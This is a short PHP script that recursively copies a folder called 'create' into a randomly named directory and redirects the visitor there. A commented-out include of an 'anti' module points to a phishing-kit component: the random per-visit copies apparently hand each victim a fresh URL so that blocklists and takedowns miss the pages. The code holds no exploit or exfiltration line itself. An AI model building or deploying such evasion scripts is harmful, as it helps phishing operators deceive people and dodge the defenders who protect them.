<?php
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);
// include('bts/anti1.php');

$HtaccessSouRce=substr(str_shuffle("abcdefhiklmnorstvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890_&"), 0, 120);

/**
 * Copy a file, or recursively copy a folder and its contents
 * @param       string   $source    Source path
 * @param       string   $HtaccessSouRce      Destination path
 * @param       int      $permissions New folder creation permissions
 * @return      bool     Returns true on success, false on failure
 */
function xcopy($source, $HtaccessSouRce, $permissions = 0755)
{
    // Check for symlinks
    if (is_link($source)) {
        return symlink(readlink($source), $HtaccessSouRce);
    }

    // Simple copy for a file
    if (is_file($source)) {
        return copy($source, $HtaccessSouRce);
    }

    // Make destination directory
    if (!is_dir($HtaccessSouRce)) {
        mkdir($HtaccessSouRce, $permissions);
    }

    // Loop through the folder
    $dir = dir($source);
    while (false !== ($entry = $dir->read())) {
        // Skip pointers
        if ($entry == '.' || $entry == '..') {
            continue;
        }

        // Deep copy directories
        xcopy("$source/$entry", "$HtaccessSouRce/$entry", $permissions);
    }

    // Clean up
    $dir->close();
    return true;
}

$source="create";
xcopy ( $source, $HtaccessSouRce );


header("location:".$HtaccessSouRce);

?>
